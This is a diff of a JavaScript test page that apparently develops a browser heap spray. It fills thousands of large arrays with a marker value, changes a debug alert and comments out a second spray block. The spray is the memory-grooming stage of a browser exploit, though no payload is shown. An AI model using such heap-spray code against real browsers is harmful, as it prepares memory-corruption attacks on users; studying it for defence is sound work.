@@ -1,5 +1,5 @@
 <script>	
-alert("start with uint8 value:0xA454A");
+alert("start with uint8 value:0xA6A");
         //var s_size = 0x10000;
     var cnt = 0x1e00//(s_size-0x14)/8;
     //alert(1)
@@ -9,6 +9,9 @@ alert("start with uint8 value:0xA454A");
         spray[i] = new Array(cnt);
         spray[i][0] = 0x666
         spray[i][cnt-1] = 0x666
+        for (var j=0; j<cnt; j++) {
+            spray[i][j] = 0x666
+        }
     }
     alert(333)
 function gc() {
@@ -60,6 +63,7 @@ alert("ok");
 if (1) {
 try{
     //var s_size = 0x10000;
+        /*
     var cnt = 0x1e00//(s_size-0x14)/8;
     //alert(1)
     var spray = new Array(0x1000);
@@ -69,6 +73,7 @@ try{
         spray[i][0] = 0x666
         spray[i][cnt-1] = 0x666
     }
+
 alert(3)
     for (var i=0; i<0x1000; i++) {
         for (var j=0; j<0x100; j++) {
@@ -76,7 +81,7 @@ alert(3)
         }
         
     }
-    
+    */
     alert('ok2');
 
 
